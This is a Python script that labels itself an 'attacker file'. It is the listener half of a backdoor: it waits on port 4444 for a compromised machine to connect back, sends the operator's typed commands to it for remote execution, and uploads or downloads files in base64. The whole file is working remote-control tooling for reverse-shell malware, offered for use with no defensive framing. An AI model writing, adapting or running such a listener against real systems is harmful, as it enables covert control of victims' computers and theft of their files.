#!/usr/bin/env python3
#this is attacker file
import socket
import json
import base64
"""
This is a listener file that will be used to listen for incoming connections from the backdoor.
"""
class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for connections")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")  # Encode file content to base64

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Decode base64 content before writing
            return "[+] Download successful"

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")  # Split the command into list
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                command_result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in command_result:
                    command_result = self.write_file(command[1], command_result)
            except Exception:
                command_result = "[-] Error during command execution."

            print(command_result)


my_listener = Listener("your ip", 4444)
my_listener.run()
